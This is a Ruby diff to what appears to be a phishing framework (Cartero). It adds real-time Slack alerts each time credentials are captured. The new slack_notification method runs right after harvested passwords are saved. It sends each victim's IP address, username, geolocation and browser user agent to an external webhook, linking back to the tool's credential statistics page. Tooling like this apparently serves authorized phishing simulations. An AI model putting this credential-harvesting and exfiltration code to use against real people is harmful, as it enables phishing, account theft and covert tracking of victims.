@@ -1,3 +1,4 @@
+require 'slack-notifier'
 #encoding: utf-8
 module Cartero
 # Documenation for SinatraHelpers
@@ -32,8 +33,11 @@ module SinatraHelpers
       :password		=> params[:password] || params[:pwd] || params[:secret] || params[params.keys.select {|x| x =~ /pass|pwd|secret/i }[0]]
     )
     creds.save!
-
-    process_metasploit_creds
+		# Why not I am lazy and this is a much 2.0 way of logging
+		# things real time while I work with the team
+		slack_notification
+    # Process metasploit creds if metasploit flag is enabled
+		process_metasploit_creds
   end
 
   def process_info
@@ -76,7 +80,34 @@ module SinatraHelpers
 
   private
 
-  def save_create_person
+	def	slack_notification
+    if ::Cartero::GlobalConfig["slack"]
+      @slack ||= Slack::Notifier.new ::Cartero::GlobalConfig["slack"]["webhook"],
+        username: ::Cartero::GlobalConfig["slack"]["username"],
+        channel: ::Cartero::GlobalConfig["slack"]["channel"]
+  		data = {
+        title: "Cartero Credential Information",
+        fallback: "*IP:* #{request.ip}\n" +
+        "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]}\n" +
+        "*GEOLOCATION* #{request.location.city}/#{request.location.country}\n" +
+        "*USER-AGENT* #{request.user_agent}",
+        text: "*IP:* #{request.ip}\n" +
+        "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]}\n" +
+        "*GEOLOCATION* #{request.location.city}/#{request.location.country}\n" +
+        "*USER-AGENT* #{request.user_agent}",
+        color: "#7CD197",
+        mrkdwn_in: ['pretext', 'text', 'fallback']
+      }
+      data[:title_link] = ::Cartero::GlobalConfig["slack"]["adminweb"] + "/stats/credentials" if ::Cartero::GlobalConfig["slack"]["adminweb"]
+      @slack.ping(
+        "New Credential found on #{request.base_url}",
+        attachments: [ data],
+        icon_url: "http://s30.postimg.org/kx40gchpd/Screen_Shot_2015_03_16_at_19_30_14.png"
+      )
+    end
+	end
+
+	def save_create_person
     person = Person.where(:email => @data[:email]).first
 
     if person.nil?
